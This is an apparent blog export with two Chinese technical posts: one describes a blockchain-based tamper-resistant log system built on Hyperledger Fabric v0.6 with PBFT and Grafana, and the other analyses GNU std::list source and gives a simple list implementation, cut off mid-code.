概述背景云计算已经被认为是下一代的信息技术基础设施，因为它在信息技术的发展史上有着史无前例的优势：自助按需服务，随时随地地进行网络访问，位置独立的资源池、弹性资源，基于使用的计费以及风险转移。作为一项具有深远影响的颠覆性技术，云计算正在改变企业使用信息技术的模式，一个典型的方面是数据正在被集中外包给云。从用户角度来看，包括个人和企业用户，将数据灵活的以按需分配的方式存储到云端带来了有吸引力的好处：缓解了存储管理负担，减少了在硬件、软件以及维护人员上的花销。云存储的概念正是从云计算引申而来的，它是一种通过将网络中不同的存储设备利用分布式和集群技术组合起来协同工作的新型存储技术，并能够对外提供大量数据的存储服务以及业务访问服务。日志即为一种云存储的方式。用户通过URL请求特定域名下的资源，这些资源会被保存在特定服务器上，Web服务器在响应用户请求的同时可以以日志文件记录用户请求的全过程，即Web日志。日志几乎内建于所有的系统中，它被用于记录系统运行时产生的信息，如日常操作、网络访问、系统警告等事件的相关属性和信息。 随着互联网的迅速发展，计算机系统从防火墙、数字加密、身份认证、访问控制、数字签名技术等方面加强安全维护，但仍存在被非授权用户攻击的风险。日志经常是入侵者的主要攻击目标，容易受到篡改、删除、伪造等破坏。存储安全是数据安全的关键。因此，建立安全的日志系统是非常必要的。 区块链技术的发展，为实现日志信息的保护、分享、多边利益最大化提供了可能，为实现安全日志系统提供了保障。区块链技术具有去中心化、不可篡改和追踪溯源等特性，其应用场景已涉及医疗、电网、农产品追溯方向。区块链将信任关系从中心化的机构转移到所有参与计算的个体上，一旦某个交易被篡改，区块链网络中的节点会检测出该行为，只有多个节点同时遭受攻击时才会面临数据的丢失和泄露等风险，从而可以防止数据泄露、合谋攻击、伪造等不良行为。 特色描述目前，区块链和日志服务系统存在以下匹配或矛盾的地方： 区块链有多个副本，有助于日志的保存； 共识机制缓慢不利于日志的保存； 共识机制可保障日志的先后顺序不被打乱； 具有可追溯性，每个日志都有数字签名，可以明确查到提交者； 区块链节点数量少时安全性降低； 由于每个节点都保存日志的完整版本，对存储空间消耗大。 综上所述，我们对本项目进行了系统性分析、规划，以下为该项目的特点： 分布式存储多个副本； 灵活支持多种日志格式，便于程序化分析； 顺序性有保障； 防篡改； 多方签名防日志伪造； 机器使用可信根作为信任基； 日志存储准确率高； 提供可视化界面，方便查看。 前景分析区块链因为比特币的的出现为人们所熟知，从产生迄今，在金融、证券、资本和科技行业的应用呈现出爆发式增长。虽然比特币是区块链最著名的应用，但区块链可以应用于远不止加密货币的各种应用。由于它可以在没有银行或任何第三方可信中间机构的情况下在双方之间完成支付，区块链可以应用于数字资产、汇款以及在线支付等各种金融服务。此外，构建于区块链技术之上的各种应用，例如智能合约应用、物联网和安全服务等，也正在成为构建下一代互联网应用最有前景的技术之一。 区块链技术的出现也为云存储安全的研究提供了一种新的研究思路。因为在现实环境中，完全公平公开的第三方机构是不可能的，且存在多个参与方共谋攻击或者欺骗另一方的问题。区块链技术去中心化的分布式架构和去信任化的运行机制使得建立一个不依赖于可信第三方的去中心化审计架构成为可能。区块链中每个区块的数据以时间顺序加密存放，具有唯一性。倘若篡改其中某区块的数据，从理论上来说其计算开销是相当巨大的，而且修改是不可逆的，这样就制约了服务商随意篡改数据的行为。区块链技术的去中心化存储架构，只有区块链网络中的多个对等节点同时遭受攻击时才会面临数据的丢失和泄露等风险，从而可以防止数据泄露等危险。 伴随着高级持续威胁攻击的复杂多变，安全技术、产品不断推陈出新，安全厂商推出的防火墙、网络入侵检测、网络入侵防御、蜜罐、上网行为管理、安全审计、网络流量分析等众多产品涵盖到了网络安全、主机安全、Web安全、数据安全、移动安全、安全管理、工控安全等各个方面，同时也就是因为产品多样、技术多变，导致安全信息无法整合、高效利用。常见的日志服务器虽然实现了系统相关信息的存储，不能保证日志的安全问题。加强Web网站的网络和信息安全，仍需一种安全的日志系统。在这种情况下，基于区块链的安全日志系统就为解决问题提供了可能。该项目通过结合区块链技术，设计链上数据存储模式，有效地解决了日志文件易被篡改的问题，同时提供了可视化界面让用户能够使用日志相关的安全分析功能。 本项目的针对范围是提供Web服务的中小企业，它们内部维护有大量服务器，每天需要产生大量的日志，怎样合理地对日志进行分析，抓住重点，在日志中找到入侵或者非常规请求的操作，解决潜在的Web安全问题，对于有大量Web服务器的公司来说，开发一套安全的日志系统就显得尤为重要，这样不仅增强了系统的安全性，更易于服务器的维护。 设计与实现整体设计功能设计本项目设计并实现了基于区块链的安全日志系统。该系统共有三个模块：日志收集模块，日志存储模块，日志分析展示模块。日志收集模块提供日志过滤，关键字提取和日志发送的功能，支持处理任意格式日志。对于日志存储模块，我们基于fabric v0.6区块链实现日志接收，安全存储与查询功能。同时我们利用grafana数据可视化工具与区块链进行对接，实现日志可视化分析功能。在各个模块的数据传输中，会对数据进行签名来进行身份验证，以防日志伪造等问题。 整个项目的功能设计图如下： 硬件拓扑设计本项目的整体框架是在各个产生日志的web服务器上部署日志收集模块来获取日志，将日志发送到区块链，各节点进行共识后存储。然后grafana从区块链中读取日志数据，进行可视化分析与展示。整个系统的硬件拓扑图如下： 具体流程设计日志收集模块设计日志收集模块安装于各个产生日志的服务器上，运维人员通过HTTP API的方式进行日志收集任务管理、更新，脱离配置文件。日志收集模块接收到任务后，对指定的日志文件进行按行读取，等待读取至100条（默认值，可自定义修改）时，将日志打包根据任务内容进行过滤与关键字段提取，最后发送至区块链。 工作流程如下： 区块链存储模块设计区块链存储模块是在 hyperledger fabricv0.6 的基础上改写智能合约实现的，提供 RESTFUL API 进行日志接收，查询日志功能。 在Fabric v0.6版本中，主要分为Membership、Consensus、Chaincode、Ledger、P2P、Event Stream等核心模块。 Membership：负责签发相应的E-cert、T-cert、TLS-cert等证书。会员注册、⾝身份保护、 内容保密、交易审计功 能，以保证平台访问的安全性。 Consensus：负责整个区块链的共识，统一交易顺序，保证区块链的一致性。 Chaincode：即链码（Fabric中的智能合约），用于执行区块链网络中的交易。 Ledger：用于存储Transaction log以及交易中的Key-Value。 P2P：基于Google的Grpc框架的底层网络通信层。 Event Stream：事件订阅发布组建，用于接收交易及区块事件。贯穿于其他各个组件中间，为各个组件间的异步通信提供了技术实现 区块服务（Blockchain Services）：负责节点间的共识管理、账本的分布式计算、账本的存储以及节 点间的P2P协议功能的实现，是区块链的核⼼心组成部分，为区块 链的主体功能提供了底层⽀撑。 Fabric v0.6版本的架构图如下： hyperledger fabricv0.6使用pbft (Practical Byzantine Fault Tolerance,实用拜占庭容错算法)作为共识算法，可以在信任程度较低的场景下避免拜占庭问题。在3f+1个共识节点中能忍受f个节点出错且依然能实现正确共识，提高现实使用中的容错率，增强实用性。 下图为Fabric v0.6的运行流程图： 日志收集模块需要先向Membership申请E-cert，通过E-cert去申请T-cert，由T-cert对应的私钥进行签名日志发送至VP节点进行三阶段共识，完成之后各个节点会通过Chaincode按顺序执行区块中的交易，并更新账本。 可视化分析模块设计可视化分析模块基于grafana实现。我们开发grafana的插件，使其能够从区块链中读取日志并进行可视化分析。 Grafana是一款用Go语言开发的开源数据可视化工具，可以做数据监控和数据统计。Grafana具有以下特点： 可视化：快速和灵活的客户端图形具有多种选项。面板插件为许多不同的方式可视化指标和日志。 报警：可视化地为最重要的指标定义警报规则。Grafana将持续评估它们，并发送通知。 通知：警报更改状态时，它会发出通知。接收电子邮件通知。 动态仪表盘：使用模板变量创建动态和可重用的仪表板，这些模板变量作为下拉菜单出现在仪表板顶部。 混合数据源：在同一个图中混合不同的数据源!可以根据每个查询指定数据源。这甚至适用于自定义数据源。 注释：注释来自不同数据源图表。将鼠标悬停在事件上可以显示完整的事件元数据和标记。 过滤器：过滤器允许您动态创建新的键/值过滤器，这些过滤器将自动应用于使用该数据源的所有查询。 功能强大的grafana可以帮助我们方便地进行日志分析。 详细实现日志收集模块Filter在日志收集任务部署时可指定每行日志必须包含的字符串数组incl[]与不可包含的字符串数组exec[]。对每行日志进行判断是否满足包含所有incl[]内的字符串，及不包含exec[]内的字符串。若不满足要求，则把该行日志丢弃。 extractor在日志收集任务部署时指定日志分隔符用于将该行日志分成若干段，并根据指定的对应关键字段名称及字段位置，提取出关键字段，同时将其余日志字段丢弃。也可通过不指定分隔符和关键字段名称，位置来不进行关键字段提取，这时返回整行日志。为了使日志在区块链中按时间顺序储存，在extract过程中判断有无timestamp字段，若无，则把当前时间添加到timestam字段。 sender在日志收集任务部署时指定目标区块链各节点的url，并以当前日志任务名作为日志包索引，将已经过滤和提取关键字段的日志利用fabric v0.6的restful api进行日志发送。在发送时，根据任务配置中的区块链节点，每次随机选取其中一个节点作为pbft共识的主节点，进行日志发送，从而每个区块链节点都作为主节点进行共识，提高共识并行性。 区块链存储模块接收并存储日志当区块链节点接收到日志收集模块发送的chaincode invoke请求时，chaincode通过一个事务请求来执行对账本的当前状态数据库操作。chaincode执行会生成一组读写集，将接收到的第一个参数，即日志文件路径作为ID，这组读写集将被提交到状态数据库储存，并转发给其他共识节点进行pbft共识。 下图为pbft执行过程： 假设系统要求每次产生区块的时间间隔为𝑡，则在一切正常的情况下，算法按照以下流程执行： 任意节点向全网广播日志数据，并附上发送者的签名 所有备份节点均独立监听全网的日志数据，并记录在内存 主节点在经过时间𝑡后,发送〈𝑃𝑒𝑟𝑝𝑎𝑟𝑒𝑅𝑒𝑞𝑢𝑒𝑠𝑡,ℎ,𝑣,𝑝,𝑏𝑙𝑜𝑐𝑘,〈𝑏𝑙𝑜𝑐𝑘〉𝜎𝑝〉 备份节点𝑖在收到提案后，发送〈𝑃𝑒𝑟𝑝𝑎𝑟𝑒𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒,ℎ,𝑣,𝑖,〈𝑏𝑙𝑜𝑐𝑘〉𝜎𝑖〉 任意节点在收到至少𝑛−𝑓个〈𝑏𝑙𝑜𝑐𝑘〉𝜎𝑖后，共识达成并发布完整的区块 任意节点在收到完整区块后，将包含的日志从内存中删除，并开始下一轮共识 该算法要求参与共识的节点中，至少有𝑛−𝑓个节点具有相同的初始状态：即对于所有的节点𝑖，具有相同的区块高度ℎ和视图编号𝑣。而这个要求很容易达成：通过区块同步来达到ℎ的一致性，通过视图更换来达到𝑣的一致性。节点在监听全网交易以及在收到提案后，需要对交易进行合法性验证。如果发现非法交易，则不能将其写入内存池；如果非法交易包含在提案中，则放弃本次共识并立即开始视图更换。 交易的验证流程如下： 交易的数据格式是否符合系统规则，如果不符合则判定为非法； 交易在区块链中是否已经存在，如果存在则判定为非法； 交易的所有合约脚本是否都正确执行，如果没有则判定为非法； 交易中有没有多重支付行为，如果有则判定为非法； 如果以上判定都不符合，则为合法交易； 当节点𝑖在经过2𝑣+1.𝑡的时间间隔后仍未达成共识，或接收到包含非法交易的提案后，开始进入视图更换流程： 令𝑘 = 1，𝑣𝑘 = 𝑣 + 𝑘； 节点𝑖发出视图更换请求〈𝐶ℎ𝑎𝑛𝑔𝑒𝑉𝑖𝑒𝑤,ℎ,𝑣,𝑖,𝑣𝑘〉； 任意节点收到至少𝑛 − 𝑓个来自不同𝑖的相同𝑣𝑘后，视图更换达成，令𝑣 = 𝑣𝑘并开始共识； 如果在经过2𝑣𝑘+1.𝑡的时间间隔后，视图更换仍未达成，则𝑘递增并回到第2步； 随着𝑘的增加，超时的等待时间也会呈指数级增加，可以避免频繁的视图更换操作，并使各节点尽快对𝑣达成一致。 而在视图更换达成之前，原来的视图𝑣依然有效，由此避免了因偶然性的网络延迟超时而导致不必要的视图更换。 最终日志在链上储存如下： 节点主动恢复的功能区块链网络在运行过程中，可能出现网络抖动、磁盘故障等原因，可能会导致部分节点的执行速度落后大多数节点，因此需要添加主动恢复的功能才能参与后续的共识流程，为了解决这类问题，就需要通过主动索取共识网络中所有节点的视图，最新的区块高度等信息才能更新自身的数据状态，最终与系统的数据保持一致。 在节点启动、节点状态异常或者多次发起 viewchange 却不被其他节点接受的时候，节点就应该发起主动恢复数据的请求，同步区块高度、共识网络视图等信息。 主动恢复的流程主要分为 2 步： NegotiateView 同步当前的视图信息和路由信息； 同步全网最新区块信息。 以下为具体流程： 待恢复节点首先广播 QueryView 消息，获取网络中所有节点的当前视图信息和路由信息 其余正常节点收到 QueryView 消息后，返回当前节点的当前视图信息 view，当前节点名称 ReplicaId 和路由信息 N（节点总数） 待恢复节点如果收到 quorum 个（2f+1）包含相同的 N 和 view 的QueryViewResonse 消息，或者收到 2f 个包含相同 N 和 view 的报文且报文的 view 不等于当前待恢复节点的 view，则将本节点的视图 view 同步成全成网络的 view 和 N 待恢复节点广播 RevoeryToCheckpoint 消息到网络所有节点，请求其余节点的检查点 checkpoint 信息和 pset、qset 和 cset 的信息（即 PBFT 算法中 pre-prepare阶段、prepare 阶段和 commit 阶段的数据） 正常节点收到 RevoeryToCheckpoint 消息和 RecoveryToPQC 信息后，将自身的检查点信息和 PQC 信息返回给待恢复节点 待恢复节点收到 quorum 个 RevoeryToCheckpointResponse 消息后，找到待恢复的稳定的 chekpoin 点，调用 stateUpdate 更新至 chekpoin 点状态，更新完毕后如果发现自身的 checkpoint 仍然落后，则发送 RecoveryToPQC 消息，获取 PQC 消息更新自身的 pset、qset 和 cset 集合。 当坏节点主动恢复时流程如下图： 查询日志通过写 query chaincode,在其中调用 ChaincodeStubInterface 接口的 GetHistoryForKey()方法来查询指定 ID 的历史日志。外界可利用 fabric 的 http api 调用 query chaincode。 chaincode智能合约initInit方法会在chaincode接收到instantiate（实例化）或者upgrade(升级)交易时被调用，进而使得chaincode顺利执行必要的初始化操作。在init参数中需给出当前日志任务名和其关键字名，创建一个空 []map[string]interface&#123;&#125;，用于以后存储日志。同时将关键字名存储在[]string中，用于grafana查询。并初始化日志条数为0。 invoke日志收集模块触发invoke来进行日志存储。将sender发过来的日志切片进行Unmarshal反序列化后，append到已有的日志切片中，并按时间戳进行排序，保证按时间顺序存储。 queryQuery chiancode设计了search_keywords，get_num，get_logs，get_delete_info四种方法供grafana查询。search_keywords用于查询有哪些关键字，返回[]string；get_num用于查询该任务在区块链中存了多少条日志，返回[]byte(int64); get_logs返回每条日志的要查询的关键字段，返回map[string][]interface&#123;&#125;,即map[关键字名称][content1,content2,...]；get_delete_info查询历史delete操作信息，包括删除操作的时间，所删除的日志数。 delete用于对chaincode中所设定的时间以前的日志数据进行删除。触发delete chaincode，首先对所有日志按时间顺序进行遍历，并删除所有规定时间前的数据，最后记录本次删除操作的时间和删除日志数。 定期清理日志为降低存储成本，我们考虑对区块链中存储的日志区块进行定期截断。当前考虑对区块链中半年前（时间可自定义，但是固定在chiancode中的，部署之后不可修改）的日志区块进行删除。我们在init,invoke,query chaincode的基础上添加delete chaincode，用于执行区块删除操作。在peer节点启动时开启一个线程去每天触发一次delete交易，这样该delete交易通过pbft共识到达所有peer节点后，执行delete chaincode去清理半年前的日志区块。 为不破坏区块链结构，我们保留一个半年前的区块，作为被截断后的区块链的创世区块，使得截断后的区块链能够通过hash校验，保证安全性。 可视化分析模块Grafana作为最火热的开源数据可视化工具，最大的特点就是支持多种数据源以及丰富的插件库。SimpleJson是Grafana开源社区提供的数据源，它本身并不依赖某种特定的后端存储，只需要后端能实现Grafana报表的几个查询接口就行。SimpleJson是Grafana众多数据源插件中的一种，但它又不像其他插件配置好数据库信息就能用，开发者需要自己实现一部分数据源插件的功能来使SimpleJson插件能够使用。 我们基于SimpleJson编写grafana datasource插件，使grafana 可以通过 fabric的 http api 调用 query chaincode 读取储存在区块链中的日志数据。 系统分析本项目通过以区块链存储技术为支撑，设计并实现了一套为企业和个人用户存储日志的安全系统。相比于市面上已有的产品，具有较高的安全性，能有效防止日志遭到篡改或删除。同时提供了查询与可视化功能，方便用户针对日志进行分析，能及时有效了解服务器运行状况。 本项目的安全性分析如下： 以区块链为依托提高数据安全性 本项目将日志实时发送至区块链并存储，黑客若想在本地节点篡改某一日志内容，那么根据存储的原理，首先需要伪造日志提交者的签名，姑且不论能否获得日志提交者的私钥，在签名伪造成功后，仍需持续更改本区块的hash值，这就会直接导致后续区块无法通过Hash值连接本区块，也就需要对后续区块的所有Hash值进行再计算，再更改。即使进行了如此大量的运算与更改，但也仅仅局限于本地节点的账本中区块链结构，仍需继续更改索引数据库和状态数据库。假设这些更改在本地都可以正确实施，但是，区块链是一个分布式的网络系统，单一节点的更改，必须得到其他足够多节点的认可并同步数据，这才能使后续业务正确实施。 引用pbft共识机制降低存储出错率 Pbft共识机制可以在信任程度较低的场景下避免拜占庭问题。在3f+1个共识节点中能忍受f个节点出错且依然能实现正确共识，存储日志，提高现实使用中的容错率，增强实用性；日志收集模块随机选取区块链peer节点当作共识主节点，使得多交易能够并行共识，提高系统共识效率。 多方签名防止日志、请求伪造 在系统部署时，区块链CA会对日志收集模块，区块链各节点和grafana插件发放证书，之后发送日志请求时，数据在分布式系统的节点间传播之前，均在本节点对数据进行一次摘要处理（Hash），并使用节点私钥对摘要实施非对称加密（签名），之后将数据与签名打包成消息传输给目标节点。在目标节点处对传输数据再实施一次摘要处理（Hash），并用原始节点的公钥解密签名后，将解密结果与摘要对比，验证一致方认为消息内容没有被篡改。从而可以防止非法用户对区块链调用chaincode，造成破坏。同时对与正常请求可根据签名追溯日志发送者，方便日后取证。 防止重复delete攻击 本系统新设置了delete chaincode方法用于定期截断区块链，删除设定时间之前的区块。如果黑客成功通过签名验证，为防止该chaincode被黑客利用去删除其他区块，我们将设定时间设为const变量，写死在chaincode中，一旦部署chaincode就不能更改，使得黑客即使重复调用delete chaincode也不能删除设定时间内的区块；同时，chaincode由go语言编写，利用go语言的安全性质，很难出现缓冲区溢出等漏洞去篡改时间变量。 日志多副本存储实现灾备 用区块链多节点共识存储的特性，使日志实现多副本存储，大大减小了因硬盘损坏等问题导致日志丢失的可能性。 总结云存储技术的发展让人们看到了下一代互联网技术的发展方向，但同时数据泄露、数据篡改等问题限制了云存储技术的进一步发展。 基于区块链的安全日志系统为数据安全提供了很好的保障，该日志系统通过结合区块链技术，设计链上数据存储模式，有效地解决了日志文件易被篡改、数据泄露等问题，同时提供了可视化界面让用户能够使用日志相关的安全分析功能。 随着智能技术的不断发展，日志分析也应紧跟潮流，积极引入先进的技术，同时攻击手段和方法也在不停的变化和完善，因此需要多加注意这些变化，及时更新日志分析的方法，避免误判漏判的情况。目前本项目也存在一些问题： 利用区块链存储日志记录，当日志变得很多的时候，由于所有的节点都需要保存有整个系统副本，因此会带来较大的存储开销。之后我们将进一步研究利用区块链的交叉级联特性，尽可能的减少冗余； 日志收集的任务部署尚未实现UI，目前只能手发http请求去部署收集任务； 可视化界面需要进一步优化，之后我们会丰富日志分析功能，同时设计界面布局，达到美观大方简洁的效果； 目前的工作只是简单地实现了一个基于区块链的安全日志系统，接下来还需要对系统的提速，提高存储空间利用率进行更深一步研究，同时对于区块链在其他场景里的应用也可以做进一步的探索。 参考文献[1] 费禹，宁静，胡青.基于区块链的日志存储系统 [J] .网络空间安全，2018, Vol. 9(6): 80-85. [2] 韩菊茹，纪兆轩，李一鸣.基于区块链的可信日志存储与验证系统 [J] .计算机工程，2019, Vol. 45(5): 13-17. [3] 徐治理，封化民，刘飙.一种基于信用的改进PBFT高效共识机制[J/OL].2019,36(10).[2018-06-09] [4] 刘忆宁, 周元健, 蓝如师,等. 基于区块链的云数据删除验证协议[J]. 计算机研究与发展, 2018, 55(10):107-115.","categories":[],"tags":[{"name":"区块链","slug":"区块链","permalink":"https://mundi-xu.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"云存储","slug":"云存储","permalink":"https://mundi-xu.github.io/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"},{"name":"日志系统","slug":"日志系统","permalink":"https://mundi-xu.github.io/tags/%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F/"},{"name":"智能合约","slug":"智能合约","permalink":"https://mundi-xu.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"Fabric v0.6","slug":"Fabric-v0-6","permalink":"https://mundi-xu.github.io/tags/Fabric-v0-6/"}]},{"title":"stl-list实现分析","slug":"stl-list实现","date":"2019-10-31T18:14:00.000Z","updated":"2020-12-23T15:54:13.113Z","comments":true,"path":"2019/11/01/stl-list实现/","link":"","permalink":"https://mundi-xu.github.io/2019/11/01/stl-list%E5%AE%9E%E7%8E%B0/","excerpt":"stl_list 介绍与源码分析","text":"stl_list 介绍今天我们来总结一下stl_List, 与单链表比较而言，stl_list无非就是链表结构不一样，至于其中的增删改查的细节实现本质是一样的，都是处理指针偏移。相比于vector，stl_List在插入和删除的时候可以达到O(1)的时间复杂度。 stl_list是一个双向循环链表，相对单链表来说查找效率高，无论是插入时的前插和后插，还是从后往前查找某个元素等。既然查找效率高了，自然添加，删除和修改元素时效率也就更高。唯一一个可以称为不足的就是每个节点需要耗费4字节指针来保存前一个节点的地址，因此如果遇到对内存要求比较苛刻的场景，而且一些操作单链表即可满足，那么可以考虑使用标准库中的forward_list（单链表）。 stl_list 源码分析分析gnu c++标准库中的stl_list，我们只需把握住整体结构即可，实现总共由三部分组成，链表节点(struct _List_node : public __detail::_List_node_base) ，迭代器（struct _List_iterator），链表数据结构（class list : protected _List_base&lt;_Tp, _Alloc&gt;）。 gnu下最新版本的stl_list实现加了一些额外的继承关系，_list_base中保存了一个_List_impl _M_impl中间变量，由该类_M_impl来保存节点，并对节点做基本处理。 链表节点父类维护两个指针，子类才加入具体的value。 1234567891011121314struct _List_node_base&#123; _List_node_base* _M_next; _List_node_base* _M_prev;&#125;; template&lt;typename _Tp&gt;struct _List_node : public __detail::_List_node_base&#123; ///&lt; User&#x27;s data. _Tp _M_data;&#125;; 迭代器主要是实现++和–等操作符重载，实现链表节点的前后移动。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273template&lt;typename _Tp&gt; struct _List_iterator &#123; typedef _List_iterator&lt;_Tp&gt; _Self; typedef _List_node&lt;_Tp&gt; _Node; typedef ptrdiff_t difference_type; typedef std::bidirectional_iterator_tag iterator_category; typedef _Tp value_type; typedef _Tp* pointer; typedef _Tp&amp; reference; _List_iterator() _GLIBCXX_NOEXCEPT : _M_node() &#123; &#125; explicit _List_iterator(__detail::_List_node_base* __x) _GLIBCXX_NOEXCEPT : _M_node(__x) &#123; &#125; _Self _M_const_cast() const _GLIBCXX_NOEXCEPT &#123; return *this; &#125; // Must downcast from _List_node_base to _List_node to get to _M_data. reference operator*() const _GLIBCXX_NOEXCEPT &#123; return static_cast&lt;_Node*&gt;(_M_node)-&gt;_M_data; &#125; pointer operator-&gt;() const _GLIBCXX_NOEXCEPT &#123; return std::__addressof(static_cast&lt;_Node*&gt;(_M_node)-&gt;_M_data); &#125; _Self&amp; operator++() _GLIBCXX_NOEXCEPT &#123; _M_node = _M_node-&gt;_M_next; //本质是链表节点的next指针操作 return *this; &#125; _Self operator++(int) _GLIBCXX_NOEXCEPT &#123; _Self __tmp = *this; _M_node = _M_node-&gt;_M_next; return __tmp; &#125; _Self&amp; operator--() _GLIBCXX_NOEXCEPT &#123; _M_node = _M_node-&gt;_M_prev; //本质是链表节点的prev指针操作 return *this; &#125; _Self operator--(int) _GLIBCXX_NOEXCEPT &#123; _Self __tmp = *this; _M_node = _M_node-&gt;_M_prev; return __tmp; &#125; bool operator==(const _Self&amp; __x) const _GLIBCXX_NOEXCEPT &#123; return _M_node == __x._M_node; &#125; bool operator!=(const _Self&amp; __x) const _GLIBCXX_NOEXCEPT &#123; return _M_node != __x._M_node; &#125; // The only member points to the %list element. __detail::_List_node_base* _M_node; //维护一个链表节点 &#125;; 链表数据结构实现类 _List_impl，主要用来维护链表节点，然后list类包含该类。 1234567891011121314151617181920struct _List_impl : public _Node_alloc_type &#123; __detail::_List_node_base _M_node; //其实就是维护节点，标准库中用了一个中间层来处理 _List_impl() : _Node_alloc_type(), _M_node() &#123; &#125; _List_impl(const _Node_alloc_type&amp; __a) _GLIBCXX_NOEXCEPT : _Node_alloc_type(__a), _M_node() &#123; &#125;#if __cplusplus &gt;= 201103L _List_impl(_Node_alloc_type&amp;&amp; __a) _GLIBCXX_NOEXCEPT : _Node_alloc_type(std::move(__a)), _M_node() &#123; &#125;#endif &#125;; _List_base类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546template&lt;typename _Tp, typename _Alloc&gt; class _List_base &#123; protected: typedef typename _Alloc::template rebind&lt;_List_node&lt;_Tp&gt; &gt;::other _Node_alloc_type; typedef typename _Alloc::template rebind&lt;_Tp&gt;::other _Tp_alloc_type; static size_t _S_distance(const __detail::_List_node_base* __first, const __detail::_List_node_base* __last) &#123; size_t __n = 0; while (__first != __last) &#123; __first = __first-&gt;_M_next; ++__n; &#125; return __n; &#125; _List_impl _M_impl; // 中间层类 // count the number of nodes size_t _M_node_count() const &#123; return _S_distance(_M_impl._M_node._M_next, std::__addressof(_M_impl._M_node)); &#125; public: typedef _Alloc allocator_type; void _M_clear() _GLIBCXX_NOEXCEPT; void _M_init() _GLIBCXX_NOEXCEPT &#123; this-&gt;_M_impl._M_node._M_next = &amp;this-&gt;_M_impl._M_node; this-&gt;_M_impl._M_node._M_prev = &amp;this-&gt;_M_impl._M_node; _M_set_size(0); &#125; &#125;; list类 12345678910111213141516171819202122232425262728293031323334353637383940template&lt;typename _Tp, typename _Alloc = std::allocator&lt;_Tp&gt; &gt; class list : protected _List_base&lt;_Tp, _Alloc&gt; &#123; // concept requirements typedef typename _Alloc::value_type _Alloc_value_type; __glibcxx_class_requires(_Tp, _SGIAssignableConcept) __glibcxx_class_requires2(_Tp, _Alloc_value_type, _SameTypeConcept) typedef _List_base&lt;_Tp, _Alloc&gt; _Base; typedef typename _Base::_Tp_alloc_type _Tp_alloc_type; typedef typename _Base::_Node_alloc_type _Node_alloc_type; public: typedef _Tp value_type; typedef typename _Tp_alloc_type::pointer pointer; typedef typename _Tp_alloc_type::const_pointer const_pointer; typedef typename _Tp_alloc_type::reference reference; typedef typename _Tp_alloc_type::const_reference const_reference; typedef _List_iterator&lt;_Tp&gt; iterator; typedef _List_const_iterator&lt;_Tp&gt; const_iterator; typedef std::reverse_iterator&lt;const_iterator&gt; const_reverse_iterator; typedef std::reverse_iterator&lt;iterator&gt; reverse_iterator; typedef size_t size_type; typedef ptrdiff_t difference_type; typedef _Alloc allocator_type; protected: // Note that pointers-to-_Node&#x27;s can be ctor-converted to // iterator types. typedef _List_node&lt;_Tp&gt; _Node; using _Base::_M_impl; using _Base::_M_put_node; using _Base::_M_get_node; using _Base::_M_get_Tp_allocator; using _Base::_M_get_Node_allocator; ..........................................................&#125; 大概截取了stl_list实现的一部分，主要为了体现stl_list的代码结构，具体接口实现可以查看源码。 stl-list简单实现STL_List.h123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296#ifndef STL_LIST#define STL_LIST#include &quot;Def.h&quot;__MUNDI_BEGINtemplate &lt;typename T&gt; class list&#123;public: // The list node, the parent class maintains two pointers, and the subclass adds the specific value. struct list_node_base &#123; list_node_base* Next; list_node_base* Prev; list_node_base():Next(nullptr), Prev(nullptr)&#123;&#125; &#125;; // dataEntry node struct list_node: public list_node_base &#123; T dataEntry; &#125;; // iterator struct list_iterator &#123; typedef list_iterator _Self; typedef T value_type; typedef T* pointer; typedef T&amp; reference; list_iterator() _T_STD_NOEXCEPT &#123; m_smartPtr = nullptr; &#125; explicit list_iterator(list_node_base * pNode) _T_STD_NOEXCEPT &#123; m_smartPtr = pNode; &#125; reference operator*() _T_STD_NOEXCEPT &#123; return static_cast&lt;list_node *&gt;(m_smartPtr)-&gt;dataEntry; &#125; list_node_base* operator-&gt;() _T_STD_NOEXCEPT &#123; return m_smartPtr; &#125; _Self operator++(int) _T_STD_NOEXCEPT // post increment &#123; _Self __tmp = *this; m_smartPtr = m_smartPtr-&gt;Next; return __tmp; &#125; _Self&amp; operator++() _T_STD_NOEXCEPT // pre increment &#123; m_smartPtr = m_smartPtr-&gt;Next; return *this; &#125; _Self operator--(int) _T_STD_NOEXCEPT &#123; _Self __tmp = *this; m_smartPtr = m_smartPtr-&gt;Prev; return __tmp; &#125; _Self&amp; operator--() _T_STD_NOEXCEPT &#123; m_smartPtr = m_smartPtr-&gt;Prev; return *this; &#125; bool operator==(const list_iterator &amp; _Right) const _T_STD_NOEXCEPT &#123; return m_smartPtr == _Right.m_smartPtr; &#125; bool operator!=(const list_iterator &amp; _Right) const _T_STD_NOEXCEPT &#123; return m_smartPtr != _Right.m_smartPtr; &#125; list_node_base * m_smartPtr; // Node pointer &#125;;public: typedef list_iterator iterator;public: list() // Default constructor &#123; empty_init(); &#125; list(const list&lt;T&gt; &amp; rhs) // Copy construction &#123; if(this != &amp;rhs) &#123; empty_init(); // initialization iterator itrBegin = rhs.begin(); iterator itrEnd = rhs.end(); while(itrBegin != itrEnd) &#123; list_node * tmp = static_cast&lt;list_node *&gt;(itrBegin.m_smartPtr); push_back(tmp-&gt;dataEntry); ++itrBegin; &#125; &#125; &#125; list &amp; operator = (const list&lt;T&gt; &amp; rhs) // Assignment operator overloading &#123; if(this != &amp;rhs) &#123; // If the original list has a value, it will be emptied first. if(begin() != end()) &#123; clear(); &#125; iterator itrBegin = rhs.begin(); iterator itrEnd = rhs.end(); while(itrBegin != itrEnd) &#123; list_node * tmp = static_cast&lt;list_node *&gt;(itrBegin.m_smartPtr); push_back(tmp-&gt;dataEntry); ++itrBegin; &#125; &#125; &#125; ~list() // Destructor &#123; clear(); if(pHeadNode) 